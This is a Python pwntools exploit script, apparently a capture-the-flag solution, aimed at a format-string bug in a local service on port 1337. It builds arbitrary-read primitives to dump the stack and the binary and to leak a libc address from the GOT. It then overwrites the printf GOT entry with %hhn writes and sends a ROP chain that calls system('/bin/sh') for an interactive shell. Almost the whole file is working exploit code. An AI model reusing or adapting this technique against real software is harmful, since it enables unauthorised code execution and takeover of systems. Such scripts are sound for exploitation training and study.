from pwn import *
p = remote('localhost', 1337)
libc = ELF('/usr/lib/libc.so.6')
'''
idx 6 = offset input
'''
def calculate_offset(fmt_str, offset):
    '''
    how to use:
    offset_input_stack = 6
    calculate_offset("%*0$n", offset_input_stack) + p64(target_address)
    calculate_offset("%*0$n|%*1$n", offset_input_stack) + p64(target_address) + p64(target_address + 4)
    '''
    RoundUp = lambda x: ((x + 7) & (-8))
    fmt_str += b'X'*(RoundUp(len(fmt_str))-len(fmt_str) + 8)
    total_offset = int(len(fmt_str)/8)
    offset = offset + total_offset
    for i,_ in enumerate(fmt_str.split(b'*')[1:]):
        fmt_str = fmt_str.replace('*{:d}'.format(i).encode(), '{:d}'.format(offset + i).encode())

    if len(fmt_str)%2 != 0:
        fmt_str += b"X"
    return fmt_str

def send_fmt_payload(data, ret=False):
    p.sendline(data)
    if ret:
        return p.recvuntil(ret)

def dump_binary(addr):
    start_flag = b'start|'
    end_flag = b'|end'
    with open(f'elf.dmp', 'wb') as fd:
        while True:
            if b'\n' in p64(addr):
                resp = b'\x00'
            else:
                resp = send_fmt_payload(
                    calculate_offset(start_flag + b"%*0$s" + end_flag, 6) + p64(addr)
                    , ret=end_flag
                )
                resp = resp[resp.find(start_flag)+len(start_flag):-len(end_flag)] + b'\x00'
            print(hex(addr), resp)
            addr += len(resp)
            fd.write(resp)

def dump_stack():
    end_flag = b'|end'
    for i in range(1,500+1):
        print(i, send_fmt_payload('start|%{}$p{}'.format(i, end_flag.decode()).encode(), ret=end_flag).decode())

def read_pointer(addr):
    start_flag = b'start|'
    end_flag = b'|end'
    resp = send_fmt_payload(
        calculate_offset(start_flag + b"%*0$s" + end_flag, 6) + p64(addr)
        , ret=end_flag
    )
    return u64(resp[resp.find(start_flag)+len(start_flag):-len(end_flag)].ljust(8, b'\0'))

# dump_stack()
# dump_addr(0x400000)
got_gets = 0x601020
got_printf = 0x601018
pop_rbp = 0x00400568
ret = 0x00400569
libc_gets = read_pointer(got_gets)
libc.address = libc_gets - libc.sym['gets']
log.info(f'libc gets @ 0x{libc_gets:x}')
log.info(f'libc base @ 0x{libc.address:x}')

fmt_payload = ''.join([
    # 0x00400520
    '%{}x%*0$hhn'.format(p64(pop_rbp)[0] & 0xff),
    '%{}x%*1$hhn'.format((p64(pop_rbp)[1] - p64(pop_rbp)[0]) & 0xff),
    '%{}x%*2$hhn'.format((p64(pop_rbp)[2] - p64(pop_rbp)[1]) & 0xff),
    '%{}x%*3$hhn'.format((p64(pop_rbp)[3] - p64(pop_rbp)[2]) & 0xff),

    # 0x00000000
    '%*4$hhn','%*5$hhn','%*6$hhn','%*7$hhn',

]).encode()
send_fmt_payload(
    calculate_offset(fmt_payload, 6) + 
    # 0x00400520
    p64(got_printf) + p64(got_printf+1) + p64(got_printf+2) + p64(got_printf+3) +
    # 0x00000000
    p64(got_printf+4) + p64(got_printf+5) + p64(got_printf+6) + p64(got_printf+7)
)
rop_paylod = b''.join([
    # return
    p64(ret),
    # pop rdi; ret;
    p64(libc.address + 0x0000000000101dee), p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system'])
])
p.sendline(rop_paylod)
p.interactive()

